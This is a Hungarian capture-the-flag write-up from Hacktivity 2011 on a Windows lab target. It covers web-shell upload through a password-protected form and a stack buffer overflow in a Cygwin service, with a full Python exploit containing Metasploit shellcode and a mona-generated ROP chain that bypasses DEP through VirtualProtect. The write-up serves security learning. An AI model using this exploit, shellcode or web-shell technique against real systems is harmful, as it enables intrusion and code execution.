Hacktivity 2011 CtF leírás - 2. rész (Firefly)
=============================================

Eredeti publikálás dátuma: 2011-09-22 16:52:54
(bocs a hiányzó screenshotokért, sehol nem találom őket)


Terveimmel ellentétben a CtF beszámoló második része mégsem az OpenBSD-s, hanem a Windows-os rendszerről fog szólni. A versenyen ezt sem tudtuk befejezni, kb. a verseny vége előtt 10 perccel lett kész az első exploit-kezdemény - ami ugye a legritkább esetben szokott jól működni -, így ezt is otthon fejeztem be.

Portscannel találtunk egy nyitott 1337-es portot, amin egy olyan szolgáltatás figyelt, ami bármilyen inputra visszaküldött egy szöveget, melyben üdvözölt minket a paradicsomban :) Kiderült továbbá, hogy a célpont gép 8080-as portján egy webszerver figyel, ám böngészővel megnyitva kiderült, hogy semmi sincs az oldalon. Illetve úgy tűnt, hogy semmi sincs rajt. Aztán persze DirBuster hamar megmondta, hogy van egy login/login.php script, ahol [Baby Firefly](http://headhuntershorrorhouse.wikia.com/wiki/Baby_Firefly) mellett egy usernév/jelszó párost váró formot láthattunk.

A szervezőktől még korábban azt az infót kaptuk, hogy bár a bruteforce tilos a szabályok szerint, rövid szólistákat használhatunk. Hát ilyenekbol többet is kipróbáltunk, sajátot is gyártottunk a House of 1000 Corpses film szereplőiből, stb., de csak nem sikerült megtalálni a helyes accountot.

Később kaptunk segítséget, megtudtuk, hogy a felhasználónév admin, a jelszó pedig nyolc karakter. Innen már viszonylag hamar meglett a jelszó: admin123 :D És ez nem volt benne egyik szólistában sem. Ciki.

A megtalált felhasználónévvel, jelszóval bejelentkezve egy újabb formot találtunk, ami fájlok feltöltését tette lehetové. Azt, hogy hová tölti fel a fájlokat, nem közölte a rendszer, de hamar megtaláltuk a login/uploads mappát. Innen egy PHP shellt feltöltve, és megkeresve a proof.txt-t, be is zsebeltük a felhasználói szintért járó pontokat.

A korábban említett szervert is megtaláltuk a C:\\cygwin\\usr\\bin\\server útvonalon. Ezt le is töltöttük, próbáltuk fuzzolni, de nem jutottunk vele sokra. Mivel a dumb fuzzing nem vezetett eredményre, segítségül hívtuk IDA-t. Kiderült, hogy a küldött buffer első négy bájtja fontos: az első háromnak "976"-nak kell lennie:

![ida magic number](img/windows/magic.png)

Ha ez teljesül, meghívódik egy memcpy, amivel buffer overflow-t lehet előidézni. A negyedik byte azért fontos, mert ennek a ~~háromszorosa~~ nyolcszorosa a memcpy utolsó paramétere, azaz a másolt buffer mérete.

![memcpy](img/windows/memcpy.png)

Az exploit-írás későbbi szakaszában kiderült, hogy a negyedik byte legnagyobb értéke 0x7c lehet, ezzel a hasznos teher mérete kb. 700 byte-ban maximalizálódik.

A buffer overflow-tól nem száll el a program, mert ez egy cygwin-es bináris, a cygwinnek meg van egy saját exception handlere, ami megfogja az exceptiont, és csinál egy stackdump-ot. A stack dumpból látszott, hogy itt is direkt EIP felülírásról van szó, amit tök simán ki lehet használni. Nem rémlik, hogy a célpont operációs rendszer mi is volt pontosan, Windows 7, vagy Server 2008\. Ez fontos, mert előbbi esetben, ha alapbeállításokkal megy a rendszer\*, triviális a hiba kihasználása, utóbbi esetben azért kicsit kell vele mókolni.

\* ezt persze kétlem, így túl egyszerű lett volna a feladat, de azért leírom ezt az utat is.

Miért triviális a hiba kihasználása Windows 7 esetén? Egyrészt ezen a rendszeren a DEP alapértelmezetten OptIn módban van, azaz csak a rendszerkomponensek, illetve azok a programok védettek, amelyekre ezt külön kértük.

Szóval DEP kipipálva, mi van az ASLR-rel? Egyszerű, sem a cygwin1.dll, sem a server.exe nincs /DYNAMICBASE-zel linkelve, így ők mindig ugyanott lesznek a memóriában, tehát ha valamelyikben van egy JMP ESP, vagy vele ekvivalens utasítás(sorozat), már jók vagyunk.

![server.exe cygwin1.dll aslr](img/windows/aslr.png)

A cygwin1.dll-ben három PUSH ESP # RET is van, az egyiket felhasználva hamar összedobható egy működő exploit:

```
#!/usr/bin/env python

import socket
import time
import struct
import string

magic = "976";
length = "\\x7c"
padding1 = "A" * 88;

eip = struct.pack(';lt&L', 0x610b79a5)	# PUSH ESP # RET
nopsled = "\\x90" * 100

#
# windows/exec - 196 bytes
# http://www.metasploit.com
# EXITFUNC=process, CMD=calc, VERBOSE=false
#
payload = (
"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30"
"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff"
"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2"
"\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\\x85"
"\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\\x20\\x01\\xd3\\xe3"
"\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d"
"\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58"
"\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b"
"\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff"
"\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x86\\x5d\\x6a\\x01\\x8d\\x85\\xb9\\x00"
"\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56"
"\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75"
"\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\\x63\\x61\\x6c\\x63"
"\\x00")

buffer = magic + length + padding1 + eip + nopsled + payload;

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('localhost', 1337))
s.send(buffer)
s.close()
```

Apró megjegyzés: a szerveren futó exe stack dumpjából kiderül a stack címe az elszállás pillanatában, ezért akár el is hagyható a JMP ESP, lehet direkt stack címre ugrani. Ez ugye alapesetben ellenjavallt, azonban így, hogy az exploit ennyire specifikus (csak egy gépre, egy futás erejéig kell használni), illetve ismerjük a stack címét a célgépen, megbocsátható :D

OK, mi a helyzet akkor, ha a program DEP által védett? Egyszerű: ROP-ot kell használni. Első körben kipatcheltem az exe-ből a forkot az egyszerűbb debugolás érdekében.

![patch](img/windows/patch.png)

Miután ezzel megvoltam, ráeresztettem a mona-t az exe-re. Ezt a ROP láncot generálta:

```
rop_gadgets = 
[
	0x61006aa4,	# POP EAX # RETN [cygwin1.dll] 
	0x61240910,	# ptr to &VirtualProtect() [IAT cygwin1.dll]
	0x610d2b05,	# MOV EAX,DWORD PTR DS:[EAX] # RETN [cygwin1.dll] 
	0x6114ea3a,	# XCHG EAX,ESI # RETN [cygwin1.dll] 
	0x61094000,	# POP EBP # RETN [cygwin1.dll] 
	0x610b79a5,	# & push esp #  ret  [cygwin1.dll]
	0x61043c03,	# POP EBX # RETN [cygwin1.dll] 
	0x00000201,	# 0x00000201-> ebx
	0x6104a0d8,	# POP EDX # XOR ECX,ECX # ADD ESP,20 \\
 # MOV EAX,ECX # POP EBX # POP ESI \\
# POP EDI # RETN [cygwin1.dll] 
	0x00000040,	# 0x00000040-> edx
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x41414141,	# Filler (compensate)
	0x61006aa4,	# POP EAX # RETN [cygwin1.dll] 
	0x61240000,	# &Writable location [cygwin1.dll]
	0x61096f7b,	# XCHG EAX,ECX # RETN [cygwin1.dll] 
	0x6104f400,	# POP EDI # RETN [cygwin1.dll] 
	0x6103ac02,	# RETN (ROP NOP) [cygwin1.dll]
	0x61006aa4,	# POP EAX # RETN [cygwin1.dll] 
	0x90909090,	# nop
	0x61018938,	# PUSHAD # RETN [cygwin1.dll] 
# rop chain generated with mona.py
# note : this chain may not work out of the box
# you may have to change order or fix some gadgets,
# but it should give you a head start
].pack("V*")
```

Ez a lánc a belepakolja a regiszterekbe a VirtualProtect paramétereit, csinál egy PUSHAD-ot, majd meghívja a VirtualProtect-et, futtathatóvá téve a stackot. Csakhogy, mint általában, ezen is kell módosítani, így nem működik. Egyrészt az ESI regiszterbe rossz érték (0x41414141) kerül, pedig itt egy VirtualProtect hívás címének kellene lennie. Az ESI-ben lévo érték láthatóan valamelyik "Filler" sorból származik. Ezeket különböző értékűre átírva könnyen kiderül, hogy melyik helyre kell írni a címet.

A VirtualProtect-nek megadott dwSize paraméter sem jó, hiszen túl nagy érték. Ezen is könnyen segíthetünk az előbb leírt módon.

Harmadik - legnagyobb, legtöbb szívást okozó - probléma az, hogy a mona által talált VirtualProtect nem egy VirtualProtect, hanem egy VirtualProtectEx. Ennek a függvénynek egyel több argumentuma van, mint a sima VirtualProtect-nek, így a láncban kialakított stack nem megfelelő hozzá. Mikor rájöttem, hogy ez a probléma, már könnyű volt orvosolni: csak kellett keresni egy címet az exe-ben, vagy a cygwin1.dll-ben, ami egy VirtualProtect hívásra mutat. Ebben az OllyDbg Find -> All intermodular calls menüpontja volt segítségemre.

A fent említett változásokkal már simán működött a sploit. A kész változat ezen a linkek található Metasploit modulként:

 - [paradise.rb](files/windows/paradise.rb)

Az exploitot valamilyen remote shell payloaddal meghívva lett volna egy shellünk, ami a server.exe-t futtató felhasználó jogaival fut. Azt, hogy innen hogyan tudtunk volna továbblépni, és megszerezni az Administrator proof.txt-jét, csak a szervezők tudják megmondani :)
